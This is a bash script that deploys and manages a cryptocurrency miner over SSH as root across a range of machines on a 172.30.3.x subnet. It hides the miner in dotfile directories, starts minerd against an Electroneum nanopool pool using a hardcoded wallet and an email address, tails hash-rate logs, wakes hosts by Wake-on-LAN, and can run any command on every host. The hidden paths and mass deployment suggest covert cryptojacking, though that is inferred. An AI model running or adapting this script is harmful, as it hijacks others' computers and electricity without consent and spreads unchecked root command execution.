#!/bin/bash


# readonly ENABLE_WOL="ethtool -s $( route | grep '^default' | grep -o '[^ ]*$' ) wol g"
readonly ENABLE_WOL="ethtool -s $( ip route | awk '/default/ { print $NF}' ) wol g"
readonly SCP_UPDATE_FILES=""


function checkIfUp {
	ping -W1 -c1 $1 > /dev/null && return 0 || return 1
}


function scan {
	#nmap -n -sn -oG - --max-retries=1 --host-timeout=500ms 172.30.3.11-26 | awk '/Up$/{print $2}'
	for ip in $(eval echo "172.30.3.{$BEG..$END}"); do
		ping -W1 -c1 $ip > /dev/null &&	echo -n "$ip is up " && ssh root@$ip "pgrep -f jyoX"
	done
}

function remove {
	for ip in $(eval echo "172.30.3.{$BEG..$END}"); do
		ping -W1 -c1 $ip > /dev/null || continue
		ssh root@$ip "pkill -f jyoX"
		ssh root@$ip "rm -rf /root/.start.sh /root/.mining/"
		echo "Miner removed from $ip"
	done
}

function reset {
	for ip in $(eval echo "172.30.3.{$BEG..$END}"); do
		ping -W1 -c1 $ip > /dev/null || continue
		echo "$ip is up, reset"
		ssh root@$ip "pkill -f jyoX"
		ssh root@$ip 'nohup /root/.mining/minerd -a cryptonight -o stratum+tcp://etn-eu1.nanopool.org:13333 -u etnjyoXDwRM657rdLQs55MZEcQRWofTagjUnRoEZusF2gMoU6YPgv35fjS3jU9AEJXBmujYAfUS4s1qsW8ZWY66b28jbHCHyBc.etn_$(hostname | cut -d"." -f1)/sayardiss@gmail.com -p x -t 4 >.mining/output.log 2>&1 &'
		# ssh root@$ip "nohup /root/.mining/minerd -a cryptonight -o stratum+tcp://eu2.electromine.fr:3333 -u etnjyoXDwRM657rdLQs55MZEcQRWofTagjUnRoEZusF2gMoU6YPgv35fjS3jU9AEJXBmujYAfUS4s1qsW8ZWY66b28jbHCHyBc -p x -t 4 >>.mining/output.log 2>&1 &"
	done
}

function write_wol {
	for ip in $(eval echo "172.30.3.{$BEG..$END}"); do
		ping -W1 -c1 $ip > /dev/null || continue
		# scp root@"$ip":/etc/rc.local /tmp/ && gedit /tmp/rc.local && scp /tmp/rc.local root@"$ip":/etc/
		ssh root@"$ip" "ip route | awk '/default/ { print $NF}' "
		# ssh root@"$ip" "ethtool $( ip route | awk '/default/ { print $NF}' )"
	done

}

function log {
	for ip in $(eval echo "172.30.3.{$BEG..$END}"); do
		checkIfUp $ip || continue
		# ping -W1 -c1 $ip > /dev/null || continue
		echo "On $ip"
		ssh root@$ip "grep 'H/s' .mining/output.log | tail -3"
		echo "------------"
	done
}

function update {
	for ip in $(eval echo "172.30.3.{$BEG..$END}"); do
		ping -W1 -c1 $ip > /dev/null || continue
		scp -rp '/home/user/.start.sh' '/home/user/mining_deploy/.mining' root@"$ip":/root/
		ssh root@$ip "/root/.start.sh"
		echo "$ip updated"
	done
}

function kill {
	for ip in $(eval echo "172.30.3.{$BEG..$END}"); do
                ping -W1 -c1 $ip > /dev/null || continue
                echo "$ip is up, killing minerd"
                ssh root@$ip "pkill -f electromine"
		# ssh root@$ip "ps aux | grep -f [j]yoX > /dev/null && pkill -f electromine || echo 'wasnt running'"
  done
}

function misc {
	read -p "Do you really want to execute '$1' to every computer (yes) ? " choice
	case "$choice" in
	  "yes" ) ;;
	  * ) echo "invalid"; return 1;;
	esac



	for ip in $(eval echo "172.30.3.{$BEG..$END}"); do
                ping -W1 -c1 $ip > /dev/null || continue
								echo "On $ip"
								ssh root@$ip "$1"
								echo "------------"
								# scp root@$ip:/etc/rc.local /tmp/ && gedit /tmp/rc.local && scp /tmp/rc.local root@$ip:/etc/
  done
}

function wol {
	for ip in $(eval echo "172.30.3.{$BEG..$END}"); do
		mac_list=$( arp -a | grep "$ip" | cut -d' ' -f4 | tr '\n' ' ' )
		echo "$ip : $mac_list"
		wakeonlan $mac_list
	done
}

# Set begin and end of range
if [ -z ${BEG+x} ]; then BEG=11; else echo "Begin range : $BEG"; fi
if [ -z ${END+x} ]; then END=26; else echo "  End range : $END"; fi


case "$1" in
  "-scan")
    scan
    ;;
  "-reset")
    reset
    ;;
  "-log")
    log
    ;;
  "-kill")
    kill
    ;;
  "-remove")
    remove
    ;;
  "-update")
    update
    ;;
	"-misc")
    misc "$2"
    ;;
	"-wol")
    wol "$2"
    ;;
  *)
    echo "You have failed to specify what to do correctly."
    exit 1
    ;;
esac
